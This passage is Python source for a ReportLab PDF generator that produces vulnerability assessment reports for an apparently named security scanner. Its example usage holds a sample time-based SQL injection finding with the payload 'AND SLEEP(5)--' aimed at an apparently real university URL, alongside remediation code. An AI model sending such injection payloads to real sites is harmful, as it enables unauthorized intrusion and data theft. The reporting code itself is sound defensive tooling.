        story.append(Paragraph("Root Cause Analysis", self.styles['GeoSubSection']))
        root_cause_box = f"""<font size="11" color="#8B0000"><b>Root Cause:</b> {finding.root_cause}</font>"""
        story.append(Paragraph(root_cause_box, self.styles['GeoHighlight']))
        story.append(Spacer(1, 0.2*inch))
        
        # FIX #7: Add Attack Scenario section
        story.append(Paragraph("Attack Scenario", self.styles['GeoSubSection']))
        vuln_key = finding.title.lower().replace(' ', '_').replace('(', '').replace(')', '')
        vuln_info = self.VULNERABILITY_DATABASE.get(vuln_key, {})
        scenario = vuln_info.get('attack_scenario', '')
        if scenario:
            story.append(Paragraph(scenario, self.styles['GeoBody']))
        else:
            # Fallback: generic attack scenario based on vulnerability type
            story.append(Paragraph(
                f"An attacker could exploit this {finding.title.lower()} vulnerability to {finding.business_impact.lower()}. "
                f"The attack would typically involve: (1) identifying the vulnerable endpoint, "
                f"(2) crafting a malicious payload, (3) delivering the payload to the target, "
                f"and (4) extracting sensitive data or achieving unauthorized access.",
                self.styles['GeoBody']
            ))
        story.append(Spacer(1, 0.2*inch))
        
        # Business Impact
        story.append(Paragraph("Business Impact Assessment", self.styles['GeoSubSection']))
        impact_box = f"""<font size="11" color="#8B0000"><b>Potential Business Impact:</b><br/>
        {finding.business_impact}</font>
        <br/><br/>
        <font size="10"><b>Likelihood:</b> {finding.likelihood} | 
        <b>Exploitability:</b> {finding.exploitability} | 
        <b>Time to Exploit:</b> {finding.time_to_exploit}</font>"""
        story.append(Paragraph(impact_box, self.styles['GeoImpact']))
        story.append(Spacer(1, 0.2*inch))
        
        # Evidence
        if finding.evidence:
            story.append(Paragraph("Evidence", self.styles['GeoSubSection']))
            for i, evidence in enumerate(finding.evidence, 1):
                story.append(Paragraph(f"<b>Evidence #{i}:</b>", self.styles['GeoTableCell']))
                if evidence.get('request'):
                    story.append(Paragraph("<i>Request:</i>", self.styles['GeoTableCell']))
                    story.append(Preformatted(
                        evidence['request'][:500] + "..." if len(evidence['request']) > 500 else evidence['request'],
                        self.styles['GeoCode']
                    ))
                if evidence.get('response'):
                    story.append(Paragraph("<i>Response:</i>", self.styles['GeoTableCell']))
                    story.append(Preformatted(
                        evidence['response'][:500] + "..." if len(evidence['response']) > 500 else evidence['response'],
                        self.styles['GeoCode']
                    ))
                story.append(Spacer(1, 0.1*inch))
        
        # Proof of Concept
        if finding.proof_of_concept:
            story.append(Paragraph("Proof of Concept", self.styles['GeoSubSection']))
            story.append(Preformatted(finding.proof_of_concept, self.styles['GeoCode']))
            story.append(Spacer(1, 0.2*inch))
        
        # Remediation Steps
        story.append(Paragraph("Remediation Guidance", self.styles['GeoSubSection']))
        
        # Get vulnerability-specific remediation if available
        if vuln_info.get('remediation'):
            story.append(Paragraph("<b>Recommended Actions:</b>", self.styles['GeoTableCell']))
            for i, step in enumerate(vuln_info['remediation'], 1):
                story.append(Paragraph(f"{i}. {step}", self.styles['GeoBody']))
            story.append(Spacer(1, 0.15*inch))
            
            if vuln_info.get('code_example'):
                story.append(Paragraph("<b>Code Example:</b>", self.styles['GeoTableCell']))
                story.append(Preformatted(vuln_info['code_example'], self.styles['GeoCode']))
        else:
            # Use finding-specific remediation
            for i, step in enumerate(finding.remediation_steps, 1):
                story.append(Paragraph(f"{i}. {step}", self.styles['GeoBody']))
        
        if finding.remediation_code:
            story.append(Paragraph("<b>Secure Code Implementation:</b>", self.styles['GeoTableCell']))
            story.append(Preformatted(finding.remediation_code, self.styles['GeoCode']))
        
        story.append(Spacer(1, 0.2*inch))
        
        # Compliance Impact
        if finding.compliance_impact:
            story.append(Paragraph("Regulatory Compliance Impact", self.styles['GeoSubSection']))
            compliance_text = ", ".join(finding.compliance_impact)
            story.append(Paragraph(
                f"This vulnerability may impact compliance with: <b>{compliance_text}</b>. "
                f"Failure to remediate could result in regulatory penalties and audit findings.",
                self.styles['GeoBody']
            ))
            story.append(Spacer(1, 0.15*inch))
        
        # References
        if finding.references or vuln_info.get('references'):
            story.append(Paragraph("References & Resources", self.styles['GeoSubSection']))
            all_refs = finding.references + vuln_info.get('references', [])
            for ref in all_refs[:5]:  # Limit to 5 references
                story.append(Paragraph(f"• {ref}", self.styles['GeoBody']))
        
        # FIX #9: Smart page breaks based on severity
        if finding.severity.upper() in ("CRITICAL", "HIGH"):
            story.append(PageBreak())
        else:
            story.append(Spacer(1, 0.4 * inch))
            story.append(HRFlowable(width="100%", thickness=0.5,
                                    color=colors.HexColor("#dee2e6")))
            story.append(Spacer(1, 0.2 * inch))
        
        return story
    
    def _build_recommendations_section(self, findings: List[VulnerabilityDetails]) -> List:
        """Build prioritized recommendations section"""
        story = []
        
        story.append(Paragraph("STRATEGIC RECOMMENDATIONS", self.styles['GeoSectionHeader']))
        story.append(Spacer(1, 0.2*inch))
        
        # Group by priority
        critical_high = [f for f in findings if f.severity.upper() in ['CRITICAL', 'HIGH']]
        medium = [f for f in findings if f.severity.upper() == 'MEDIUM']
        low_info = [f for f in findings if f.severity.upper() in ['LOW', 'INFO']]
        
        # Immediate actions
        story.append(Paragraph("Immediate Actions (0-7 days)", self.styles['GeoSubSection']))
        if critical_high:
            story.append(Paragraph(
                f"The following <b>{len(critical_high)} critical/high-severity</b> vulnerabilities "
                f"require immediate attention:",
                self.styles['GeoBody']
            ))
            for f in critical_high[:5]:
                story.append(Paragraph(
                    f"• <b>{f.title}</b> at {f.url} - {f.business_impact[:100]}...",
                    self.styles['GeoBody']
                ))
        else:
            story.append(Paragraph("No immediate actions required.", self.styles['GeoBody']))
        
        story.append(Spacer(1, 0.2*inch))
        
        # Short-term actions
        story.append(Paragraph("Short-Term Actions (7-30 days)", self.styles['GeoSubSection']))
        if medium:
            story.append(Paragraph(
                f"Address the following <b>{len(medium)} medium-severity</b> findings:",
                self.styles['GeoBody']
            ))
            for f in medium[:5]:
                story.append(Paragraph(f"• {f.title}", self.styles['GeoBody']))
        
        story.append(Spacer(1, 0.2*inch))
        
        # Long-term improvements
        story.append(Paragraph("Long-Term Security Improvements", self.styles['GeoSubSection']))
        long_term_recs = [
            "Implement a comprehensive Security Development Lifecycle (SDL)",
            "Deploy automated security testing in CI/CD pipeline",
            "Conduct regular security awareness training for developers",
            "Establish a vulnerability management program with defined SLAs",
            "Implement continuous security monitoring and threat detection",
            "Perform regular penetration testing and security assessments",
            "Adopt infrastructure-as-code security scanning",
            "Establish a bug bounty program for continuous security validation"
        ]
        
        for i, rec in enumerate(long_term_recs, 1):
            story.append(Paragraph(f"{i}. {rec}", self.styles['GeoBody']))
        
        story.append(PageBreak())
        return story
    
    async def generate(
        self,
        findings: List[VulnerabilityDetails],
        output_path: str,
        metadata: Dict[str, Any]
    ) -> Path:
        """
        Generate professional PDF report
        
        Args:
            findings: List of detailed vulnerability findings
            output_path: Path for output PDF
            metadata: Report metadata (target, scan_id, dates, etc.)
        
        Returns:
            Path to generated PDF
        """
        self.report_metadata = metadata
        
        # FIX #5 & Updated: Group findings by vulnerability title to prevent duplicate pages
        # Merges affected assets (URLs) for the same vulnerability
        grouped_findings: Dict[str, VulnerabilityDetails] = {}
        duplicates_removed = 0
        
        for f in findings:
            key = f.title.strip().lower()
            if key not in grouped_findings:
                # First time seeing this vulnerability type
                grouped_assets = set(f.affected_assets) if f.affected_assets else set()
                # Ensure the primary URL is also included
                if f.url:
                    grouped_assets.add(f.url)
                
                # Create a copy so we don't mutate the original list elements unexpectedly
                f.affected_assets = list(grouped_assets)
                grouped_findings[key] = f
            else:
                duplicates_removed += 1
                # Merge the affected assets
                existing = grouped_findings[key]
                new_assets = set(existing.affected_assets) if existing.affected_assets else set()
                if f.url:
                    new_assets.add(f.url)
                if f.affected_assets:
                    new_assets.update(f.affected_assets)
                
                existing.affected_assets = list(new_assets)
                
                # Keep the highest CVSS score if they differ
                if f.cvss_score > existing.cvss_score:
                    existing.cvss_score = f.cvss_score
                    existing.severity = f.severity
        
        findings = list(grouped_findings.values())
        
        # FIX #2 & #3: Use NumberedCanvas with dynamic pagesize
        doc = SimpleDocTemplate(
            output_path,
            pagesize=A4,
            rightMargin=72,
            leftMargin=72,
            topMargin=72,
            bottomMargin=72,
            title=f"Security Assessment - {metadata.get('target', 'Unknown')}"
        )
        
        story = []
        
        # Title Page
        story.append(Spacer(1, 1.5*inch))
        story.append(Paragraph("SECURITY ASSESSMENT REPORT", self.styles['GeoTitle']))
        story.append(Spacer(1, 0.5*inch))
        
        # Target info
        target_info = Table([
            ["Target:", metadata.get('target', 'N/A')],
            ["Scan ID:", metadata.get('scan_id', 'N/A')],
            ["Assessment Date:", metadata.get('scan_date', 'N/A')],
            ["Report Generated:", datetime.now().strftime("%Y-%m-%d %H:%M:%S")],
            ["Classification:", metadata.get('classification', 'CONFIDENTIAL')],
        ], colWidths=[1.5*inch, 4.2*inch])
        
        target_info.setStyle(TableStyle([
            ('FONTNAME', (0, 0), (0, -1), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, -1), 12),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 12),
            ('TOPPADDING', (0, 0), (-1, -1), 12),
            ('BACKGROUND', (0, 0), (0, -1), colors.HexColor('#f8f9fa')),
            ('GRID', (0, 0), (-1, -1), 1, colors.HexColor('#dee2e6')),
        ]))
        
        story.append(target_info)
        story.append(Spacer(1, 1*inch))
        
        # Disclaimer
        disclaimer = """<para alignment="center" fontSize="10" textColor="gray">
        This report contains confidential and proprietary information.<br/>
        Distribution is limited to authorized personnel only.<br/><br/>
        <b>Gecko Apocalypse Security Engine v10.0</b>
        </para>"""
        story.append(Paragraph(disclaimer, self.styles['GeoBody']))
        story.append(PageBreak())
        
        # Table of Contents placeholder
        story.append(Paragraph("TABLE OF CONTENTS", self.styles['GeoSectionHeader']))
        toc_items = [
            "1. Executive Summary",
            "2. Detailed Findings",
            "3. Strategic Recommendations",
            "4. Appendix: Methodology",
            "5. References"
        ]
        for item in toc_items:
            story.append(Paragraph(f"• {item}", self.styles['GeoBody']))
        story.append(PageBreak())
        
        # Executive Summary (pass duplicates_removed count)
        story.extend(self._build_executive_summary(findings, duplicates_removed))
        
        # Detailed Findings
        story.append(Paragraph("DETAILED FINDINGS", self.styles['GeoSectionHeader']))
        story.append(Spacer(1, 0.2*inch))
        
        for i, finding in enumerate(findings, 1):
            story.extend(self._build_detailed_finding(finding, i))
        
        # Recommendations
        story.extend(self._build_recommendations_section(findings))
        
        # Methodology
        story.append(Paragraph("APPENDIX: ASSESSMENT METHODOLOGY", self.styles['GeoSectionHeader']))
        methodology = """<font size="11">
        This security assessment was conducted using the Gecko Apocalypse Engine v10.0, 
        employing industry-standard methodologies including OWASP Testing Guide v4, 
        PTES (Penetration Testing Execution Standard), and NIST SP 800-115.
        <br/><br/>
        The assessment included automated scanning, manual verification, and contextual 
        analysis to minimize false positives and provide actionable remediation guidance.
        </font>"""
        story.append(Paragraph(methodology, self.styles['GeoBody']))
        
        # FIX #1 & #2: Build with NumberedCanvas and header/footer callback
        def _draw_chrome(canvas_obj: canvas.Canvas, page_num: int, total_pages: int):
            """Draw header and footer chrome on each page"""
            # FIX #3: Derive dimensions from actual pagesize
            w, h = doc.pagesize
            
            # Header background
            canvas_obj.saveState()
            canvas_obj.setFillColor(colors.HexColor('#1a1a2e'))
            canvas_obj.rect(0, h - 40, w, 40, fill=1, stroke=0)
            
            # Header text
            canvas_obj.setFillColor(colors.white)
            canvas_obj.setFont('Helvetica-Bold', 14)
            canvas_obj.drawString(40, h - 25, "Gecko Apocalypse Security Assessment")
            
            canvas_obj.setFont('Helvetica', 10)
            canvas_obj.drawString(w - 200, h - 25, f"Report ID: {self.report_metadata.get('scan_id', 'N/A')}")
            
            # Classification banner
            classification = self.report_metadata.get('classification', 'CONFIDENTIAL')
            if classification == 'CONFIDENTIAL':
                canvas_obj.setFillColor(colors.red)
            elif classification == 'INTERNAL':
                canvas_obj.setFillColor(colors.orange)
            else:
                canvas_obj.setFillColor(colors.gray)
                
            canvas_obj.roundRect(w - 140, h - 35, 120, 25, 5, fill=1, stroke=0)
            canvas_obj.setFillColor(colors.white)
            canvas_obj.setFont('Helvetica-Bold', 10)
            canvas_obj.drawCentredString(w - 80, h - 28, classification)
            
            # Footer line
            canvas_obj.setStrokeColor(colors.HexColor('#e94560'))
            canvas_obj.setLineWidth(2)
            canvas_obj.line(40, 30, w - 40, 30)
            
            # Page number
            canvas_obj.setFont('Helvetica', 9)
            canvas_obj.setFillColor(colors.gray)
            canvas_obj.drawCentredString(w / 2, 15, f"Page {page_num} of {total_pages}")
            
            # Timestamp
            canvas_obj.drawString(40, 15, f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            # Confidentiality notice
            canvas_obj.setFont('Helvetica-Oblique', 8)
            canvas_obj.drawRightString(w - 40, 15, "Confidential - Authorized Use Only")
            
            canvas_obj.restoreState()
        
        # Build PDF with NumberedCanvas
        def canvas_maker_factory(*args, **kwargs):
            c = NumberedCanvas(*args, **kwargs)
            c.set_header_footer_callback(_draw_chrome)
            return c
            
        doc.build(story, canvasmaker=canvas_maker_factory)
        
        logger.info(f"Professional PDF report generated: {output_path}")
        return Path(output_path)


# Example usage and integration
async def main():
    """Example of how to use the professional PDF generator"""
    
    # Create sample finding with full details
    sample_finding = VulnerabilityDetails(
        title="SQL Injection (Time-Based Blind)",
        severity="CRITICAL",
        cvss_score=9.8,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe_id="CWE-89",
        cwe_name="Improper Neutralization of Special Elements used in an SQL Command",
        owasp_category="A03:2021-Injection",
        url="https://aditya.ac.in/degree",
        location="GET parameter 'id'",
        parameter="id",
        method="GET",
        description=(
            "A time-based blind SQL injection vulnerability was identified in the 'id' parameter. "
            "The application constructs SQL queries using unsanitized user input, allowing attackers "
            "to extract sensitive information from the database through time-delay responses."
        ),
        technical_details=(
            "The vulnerability exists because the application directly concatenates user input "
            "into SQL queries without proper parameterization. When the parameter contains "
            "SQL metacharacters or functions like SLEEP(), BENCHMARK(), or WAITFOR DELAY, "
            "the database executes these commands, causing measurable response delays."
        ),
        root_cause=(
            "Lack of input validation and parameterized queries. The application uses "
            "dynamic SQL construction with string concatenation instead of prepared statements."
        ),
        business_impact=(
            "Attackers can extract sensitive data including user credentials, personal information, "
            "financial records, and proprietary business data. This could lead to data breach "
            "notifications, regulatory fines (GDPR, PCI-DSS), legal liability, and severe "
            "reputational damage. Complete database compromise is possible."
        ),
        affected_assets=[
            "Primary database server",
            "User authentication system",
            "Customer PII database",
            "Financial transaction records"
        ],
        evidence=[
            {
                "request": "GET /degree?id=1' AND SLEEP(5)-- HTTP/1.1",
                "response": "HTTP/1.1 200 OK\nResponse time: 5.2s (baseline: 0.3s)"
            }
        ],
        proof_of_concept=(
            "1. Normal request: GET /degree?id=1 (Response: 0.3s)\n"
            "2. Malicious request: GET /degree?id=1' AND SLEEP(5)-- (Response: 5.2s)\n"
            "3. Confirmed SQL injection through time delay"
        ),
        remediation_steps=[
            "Replace dynamic SQL queries with parameterized prepared statements",
            "Implement input validation using allowlists",
            "Apply principle of least privilege to database accounts",
            "Deploy Web Application Firewall (WAF) with SQL injection rules",
            "Enable database query logging and monitoring"
        ],
        remediation_code=(
            "# VULNERABLE:\n"
            "query = f\"SELECT * FROM courses WHERE id = {course_id}\"\n\n"
            "# SECURE:\n"
            "cursor.execute(\"SELECT * FROM courses WHERE id = %s\", (course_id,))"
        ),
        references=[
            "https://owasp.org/www-community/Attacks/SQL_Injection",
            "https://cwe.mitre.org/data/definitions/89.html"
        ],
        compliance_impact=["GDPR Article 32", "PCI-DSS 6.5.1", "HIPAA 164.312(e)(1)"],
        likelihood="High",
        exploitability="Easy",
        time_to_exploit="Minutes",
        detected_at=datetime.now(),
        false_positive_probability=0.05
    )
    
    # Initialize generator
    config = {"theme": "professional"}
    generator = ProfessionalPDFGenerator(config)
    
    # Generate report
    metadata = {
        "target": "https://aditya.ac.in",
        "scan_id": "GEO-2024-001",
        "scan_date": "2024-01-15",
        "classification": "CONFIDENTIAL"
    }
    
    output_path = "professional_security_report.pdf"
    await generator.generate(
        findings=[sample_finding],
        output_path=output_path,
        metadata=metadata
    )
    
    print(f"✓ Professional report generated: {output_path}")


if __name__ == "__main__":
    asyncio.run(main())